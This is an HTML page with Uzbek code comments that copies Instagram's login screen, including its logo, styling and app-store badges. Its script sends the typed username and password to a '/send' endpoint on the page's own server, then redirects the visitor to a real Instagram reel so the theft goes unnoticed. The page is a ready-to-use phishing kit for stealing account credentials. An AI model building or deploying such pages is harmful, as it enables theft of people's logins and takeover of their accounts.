<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }
        
        .message-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 100%;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .logo {
            width: 175px;
            margin: 0 auto 20px;
            display: block;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 12px;
        }
        
        .input-field {
            width: 100%;
            padding: 12px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            padding-right: 40px; /* Koz ikonkasi uchun joy */
        }
        
        .input-field:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #8e8e8e;
            font-size: 14px;
        }
        
        .submit-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            margin-top: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.3s;
        }
        
        .submit-btn:hover {
            background-color: #0081d6;
        }
        
        .submit-btn:disabled {
            background-color: #b2dffc;
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider::before {
            margin-right: 15px;
        }
        
        .divider::after {
            margin-left: 15px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: 600;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
            display: inline-block;
        }
        
        .facebook-login i {
            margin-right: 8px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 100%;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .signup-text {
            font-size: 14px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .get-app {
            text-align: center;
            width: 100%;
        }
        
        .get-app-text {
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .app-button {
            height: 40px;
        }
        
        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message-box">
            <!-- Instagram logosi -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
            
            <form id="msgForm">
                <div class="input-group">
                    <input type="text" class="input-field" name="name" placeholder="Phone number, username, or email" required>
                </div>
                
                <div class="input-group">
                    <input type="password" class="input-field" id="password" name="message" placeholder="Password" required>
                    <button type="button" class="password-toggle" id="togglePassword">
                        <i class="far fa-eye"></i>
                    </button>
                </div>
                
                <button type="submit" class="submit-btn" id="loginBtn">Log In</button>
                
                <div class="error-message" id="errorMessage">
                    Sorry, your password was incorrect. Please double-check your password.
                </div>
                
                <div class="divider">OR</div>
                
                <a href="#" class="facebook-login">
                    <i class="fab fa-facebook-square"></i> Log in with Facebook
                </a>
                
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        
        <div class="signup-box">
            <p class="signup-text">Hisobingiz yo'qmi? <a href="#" class="signup-link">Ro'yxatdan o'ting</a></p>
        </div>
        
        <div class="get-app">
            <p class="get-app-text">Get the app.</p>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="app-button">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Download on the App Store" class="app-button">
            </div>
        </div>
    </div>

    <script>
        // Parolni ko'rsatish/yashirish funksiyasi
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const errorMessage = document.getElementById('errorMessage');
        
        togglePassword.addEventListener('click', function() {
            // Parol turini o'zgartirish
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            // Ikona ko'rinishini o'zgartirish
            const icon = this.querySelector('i');
            if (type === 'password') {
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            } else {
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            }
        });
        
        // Formani yuborish
        document.getElementById('msgForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            // Login tugmasini vaqtincha o'chirish
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';
            
            fetch('/send', { method: 'POST', body: formData })
                .then(() => {
                    // Xabar yuborilgach, 1 soniyadan keyin video sahifaga o'tish
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com/reel/DQUmrIajUiB/?igsh=MWRzZ2x3azMwNTNqdw==";
                    }, 1000);
                })
                .catch(() => {
                    // Xatolik yuz berganda
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'Log In';
                });
        });
        
        // Input maydonlarida o'zgarish bo'lganda xatolik xabarini yashirish
        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('input', () => {
                errorMessage.style.display = 'none';
            });
        });
    </script>
</body>
</html>
